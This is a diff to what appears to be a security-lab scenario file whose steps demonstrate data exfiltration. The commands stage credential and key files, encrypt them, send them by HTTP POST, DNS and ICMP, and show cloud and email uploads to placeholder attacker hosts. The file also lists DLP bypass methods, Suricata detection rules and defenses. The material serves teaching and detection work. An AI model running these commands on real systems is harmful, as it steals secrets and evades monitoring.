@@ -24,6 +24,7 @@ steps:
     type: output_contains
     expect: exfil_staging
     field: stdout
+  target_vm: attacker
   script: mkdir -p /tmp/exfil_staging && find /etc /home -name '*.conf' -o -name '*.key' -o -name '*.pem' -o -name '.env' 2>/dev/null | head -10 > /tmp/exfil_staging/file_list.txt && echo 'hostname:' $(hostname)
     > /tmp/exfil_staging/sysinfo.txt && id >> /tmp/exfil_staging/sysinfo.txt && ip addr | grep inet >> /tmp/exfil_staging/sysinfo.txt && cat /tmp/exfil_staging/file_list.txt && echo '---' && cat /tmp/exfil_staging/sysinfo.txt
   risk_level: low
@@ -39,6 +40,7 @@ steps:
     type: output_contains
     expect: exfil_data.enc
     field: stdout
+  target_vm: attacker
   script: tar czf /tmp/exfil_data.tar.gz -C /tmp/exfil_staging . && openssl enc -aes-256-cbc -salt -in /tmp/exfil_data.tar.gz -out /tmp/exfil_data.enc -pass pass:ExfilKey2026 -pbkdf2 && ls -la /tmp/exfil_data.enc
     && echo '' && echo 'Original:' && ls -la /tmp/exfil_data.tar.gz && echo 'Encrypted:' && file /tmp/exfil_data.enc
   risk_level: medium
@@ -54,6 +56,7 @@ steps:
     type: output_contains
     expect: Data size
     field: stdout
+  target_vm: attacker
   script: 'ENCODED=$(base64 -w 0 /tmp/exfil_data.enc) && echo "Data size: $(echo -n $ENCODED | wc -c) bytes (base64)" && echo "First 100 chars: ${ENCODED:0:100}..." && curl -s -X POST -d "upload=$ENCODED"
     http://10.20.30.80:3000/api/Feedbacks -o /dev/null -w ''HTTP Status: %{http_code}'' 2>/dev/null && echo '''''
   risk_level: medium
@@ -69,6 +72,7 @@ steps:
     type: output_contains
     expect: DNS query
     field: stdout
+  target_vm: attacker
   script: 'echo ''secret data for DNS exfil'' | base32 | tr -d ''='' | fold -w 50 | head -5 | while read chunk; do echo "DNS query: ${chunk}.exfil.attacker.com"; done && echo '''' && echo ''DNS exfil characteristics:''
     && echo ''- Max label length: 63 chars'' && echo ''- Max query length: 253 chars'' && echo ''- Throughput: ~10-50 KB/min'' && echo ''- Detection: query length, entropy, volume'''
   risk_level: medium
@@ -84,6 +88,7 @@ steps:
     type: output_contains
     expect: Data in hex
     field: stdout
+  target_vm: attacker
   script: 'DATA_HEX=$(echo -n ''exfil'' | xxd -p) && echo "Data in hex: $DATA_HEX" && echo "Sending via ICMP data field:" && ping -c 1 -p $DATA_HEX -s 64 10.20.30.80 2>&1 | head -5 && echo '''' && echo
     ''ICMP exfil tools: icmpsh, icmp-exfil, ptunnel'' && echo ''Detection: ICMP payload size > 64 bytes, high frequency'''
   risk_level: medium
@@ -100,6 +105,7 @@ steps:
     type: output_contains
     expect: Steganography
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''GIF89a\x01\x00\x01\x00\x00\x00\x00;'' > /tmp/cover.gif && echo ''SECRET: This is hidden exfiltration data'' >> /tmp/cover.gif && echo ''=== Steganography Simulation ==='' && echo ''Cover
     file:'' && file /tmp/cover.gif && echo ''Content:'' && strings /tmp/cover.gif && echo '''' && echo ''Real stego tools:'' && echo ''- steghide: embed in JPEG/BMP/WAV/AU'' && echo ''- openstego: LSB embedding''
     && echo ''- snow: whitespace steganography in text'''
@@ -116,6 +122,7 @@ steps:
     type: output_contains
     expect: Chunked Exfiltration
     field: stdout
+  target_vm: attacker
   script: 'split -b 100 /tmp/exfil_data.enc /tmp/chunk_ && echo ''=== Chunked Exfiltration ==='' && ls -la /tmp/chunk_* && echo '''' && echo ''Simulating time-delayed transfer:'' && for chunk in /tmp/chunk_*;
     do echo "$(date ''+%H:%M:%S'') Sending: $chunk ($(wc -c < $chunk) bytes)"; done && rm -f /tmp/chunk_*'
   risk_level: medium
@@ -133,6 +140,7 @@ steps:
     type: output_contains
     expect: Cloud Storage Exfiltration
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Cloud Storage Exfiltration ===\n\n[AWS S3]\ncurl -X PUT -T /tmp/exfil_data.enc \\\n  https://attacker-bucket.s3.amazonaws.com/data.enc \\\n  -H "Authorization: AWS AKIAIOSFODNN7EXAMPLE:signature"\n\n[Google
     Cloud Storage]\ncurl -X POST -T /tmp/exfil_data.enc \\\n  https://storage.googleapis.com/upload/storage/v1/b/bucket/o \\\n  -H "Authorization: Bearer token"\n\n[Azure Blob]\ncurl -X PUT -T /tmp/exfil_data.enc
     \\\n  https://account.blob.core.windows.net/container/data.enc \\\n  -H "x-ms-blob-type: BlockBlob"\n\n[Detection Challenge]\n- Traffic goes to legitimate cloud endpoints\n- HTTPS encrypted, content
@@ -152,6 +160,7 @@ steps:
     type: output_contains
     expect: Email-Based Exfiltration
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Email-Based Exfiltration ===\n\n[Method 1: SMTP via curl]\ncurl --url smtp://mail.server:25 \\\n  --mail-from sender@lab.local \\\n  --mail-rcpt attacker@evil.com \\\n  -T email.txt\n\n[Method
     2: Base64 in email body]\nDATA=$(base64 /tmp/exfil_data.enc)\necho "Subject: Report" | sendmail -f user@lab.local attacker@evil.com\n\n[Method 3: Draft folder staging]\n- Save data in email draft (IMAP)\n-
     Retrieve from external device\n- No outbound email generated\n\n[Detection]\n- DLP scanning outbound email attachments\n- Encrypted attachment alerts\n- Unusual recipient domains\n- Large attachment
@@ -171,6 +180,7 @@ steps:
     type: output_contains
     expect: Physical Exfiltration
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Physical Exfiltration Channels ==='' && echo '''' && echo ''[USB Storage]'' && lsusb 2>/dev/null | head -5 && echo ''Detection: USB device insertion logs (udev/Sysmon)'' && echo ''''
     && echo ''[Bluetooth]'' && echo ''hcitool scan -> discover nearby devices'' && echo ''obexftp -b MAC -p file -> transfer via OBEX'' && echo '''' && echo ''[Other Channels]'' && echo ''- Screen capture
     / photography'' && echo ''- Printed documents'' && echo ''- Audio (ultrasonic data transmission)'' && echo ''- WiFi (rogue AP for data transfer)'' && echo '''' && echo ''[Defense]'' && echo ''- USB
@@ -190,6 +200,7 @@ steps:
     type: output_contains
     expect: Exfiltration Channel Comparison
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Exfiltration Channel Comparison ===\n\nChannel      | Bandwidth   | Stealth  | Availability | Detection\n------------ | ----------- | -------- | ------------ | ----------\nHTTPS        |
     High (MB/s) | Medium   | Usually      | DLP, proxy\nDNS          | Low (KB/s)  | High     | Almost always| DNS analytics\nICMP         | Low (KB/s)  | High     | Usually      | Payload analysis\nEmail        |
     Medium      | Medium   | Usually      | Email DLP\nCloud        | High        | High     | Varies       | CASB\nSteganography| Low         | Very High| Always       | Stego analysis\nPhysical     |
@@ -210,6 +221,7 @@ steps:
     type: output_contains
     expect: DLP Bypass
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== DLP Bypass Techniques ===\n\n[Content Inspection Bypass]\n1. Encryption: AES/XOR makes content unreadable\n2. Encoding: Base64, custom encoding schemes\n3. Splitting: Divide data
     below inspection threshold\n\n[Pattern Matching Bypass]\n4. Obfuscation: Replace patterns (SSN: XXX-XX-XXXX -> encoded)\n5. File type masquerade: Rename .zip to .jpg\n6. Polyglot files: Valid as multiple
     formats\n\n[Behavioral Analysis Bypass]\n7. Low-and-slow: Small amounts over long time\n8. Business hours only: Blend with normal activity\n9. Legitimate channels: Use approved cloud services\n\n[Network
@@ -231,6 +243,7 @@ steps:
     type: output_contains
     expect: Suricata
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Suricata Exfiltration Detection Rules ===\n\n# DNS Tunneling: Long subdomain queries\nalert dns any any -> any 53 (msg:"Possible DNS tunneling - long query"; dns.query; content:"."  ;
     pcre:"/^[a-zA-Z0-9]{30,}\\./"; threshold:type threshold, track by_src, count 10, seconds 60; sid:1000001; rev:1;)\n\n# HTTP Large Upload\nalert http any any -> any any (msg:"Large HTTP POST upload";
     flow:to_server,established; http.method; content:"POST"; http.content_len; content:!"|30|"; byte_test:0,>,1000000,0,string; sid:1000002; rev:1;)\n\n# Base64 in HTTP Body\nalert http any any -> any any
@@ -249,6 +262,7 @@ steps:
     type: output_contains
     expect: removed
     field: stdout
+  target_vm: attacker
   script: shred -u /tmp/exfil_data.enc /tmp/exfil_data.tar.gz 2>/dev/null; rm -rf /tmp/exfil_staging /tmp/cover.gif && echo 'Staging area cleaned' && ls /tmp/exfil_* 2>/dev/null || echo 'All exfil files
     removed'
   risk_level: low
@@ -313,6 +327,7 @@ steps:
     type: output_contains
     expect: Exfiltration Defense Strategy
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/exfil_defense.txt << ''EOF''
 
     === Data Exfiltration Defense Strategy ===
